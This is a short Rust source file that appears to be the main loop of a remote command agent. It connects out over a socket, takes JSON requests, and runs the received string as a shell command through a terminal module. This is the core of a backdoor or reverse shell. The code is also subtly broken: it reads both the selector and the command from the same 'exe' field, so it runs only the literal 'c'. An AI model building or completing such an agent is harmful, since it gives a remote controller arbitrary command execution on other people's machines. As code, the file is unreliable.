use crate::communication::sock;
use crate::commands::terminal;
use crate::communication::convert;
use std::error::Error;

pub mod communication;
pub mod commands;

fn main() {
    let mut stream = sock::establish();
    loop {
        match sock::recv(&mut stream) {
            Ok(request) => {
                let cmd = convert::jsonval2str(&request["exe"]);
                match cmd {
                    "c" => {
                        let command = convert::jsonval2str(&request["exe"]);
                        match terminal::execute_command(&command) {
                            Ok(out) => {
                                println!("stdout: {:?}", out);
                            }
                            Err (error) => {
                                println!("error: {}", error);
                                break
                            }
                        }
                    }
                    _ => {}
                }
            },
            Err(error) => {
                println!("error: {}", error);
                break
            }
        }
    }
    
    sock::close(&mut stream);
    println!("Terminated.");
}
